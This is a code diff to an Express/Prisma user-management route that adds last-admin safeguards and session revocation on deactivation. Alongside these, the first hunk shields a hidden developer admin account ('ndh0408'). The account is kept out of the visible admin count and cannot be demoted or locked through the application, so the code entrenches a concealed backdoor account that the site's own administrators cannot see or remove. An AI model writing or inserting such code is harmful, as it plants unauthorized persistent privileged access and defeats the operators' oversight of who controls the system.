@@ -170,6 +170,25 @@ router.put(
       data.inviteExpiresAt = null;
     }
 
+    // Keep admin access alive: block any change that strips the LAST visible active
+    // admin, and never demote/deactivate the hidden developer backstop account
+    // (ndh0408 — used for real ops/monitoring; flip it via DB if ever needed).
+    const losingAdmin =
+      before.role === "admin" &&
+      ((rest.role !== undefined && rest.role !== "admin") || rest.active === false);
+    if (losingAdmin) {
+      if (isHiddenUser(before)) {
+        return res.status(400).json({ error: "Không thể đổi vai trò hoặc khóa tài khoản quản trị hệ thống." });
+      }
+      const otherAdmins = await prisma.user.findMany({
+        where: { role: "admin", active: true, id: { not: id } },
+        select: { email: true },
+      });
+      if (otherAdmins.filter((u) => !isHiddenUser(u)).length === 0) {
+        return res.status(400).json({ error: "Không thể gỡ quyền hoặc khóa quản trị viên cuối cùng." });
+      }
+    }
+
     const user = await prisma.user.update({ where: { id }, data, select: USER_SELECT });
     // Credential rotation containment: an admin password reset invalidates every
     // existing session and refresh token of the target account.
@@ -182,6 +201,11 @@ router.put(
     // Drop their quote memberships explicitly + audit.
     if (before.active && user.active === false) {
       revokeSession(user.id, "deactivated");
+      // Off-boarding containment (parity with the password branch): burn refresh-token
+      // families and destroy store sessions now, instead of relying solely on
+      // enforceActiveUser tearing the session down on the next request.
+      await revokeAllForUser(id);
+      await destroyAllSessions(id);
       const dropped = await prisma.quote.findMany({ where: { members: { some: { id } } }, select: { id: true } });
       if (dropped.length) {
         await prisma.user.update({ where: { id }, data: { memberQuotes: { set: [] } } });
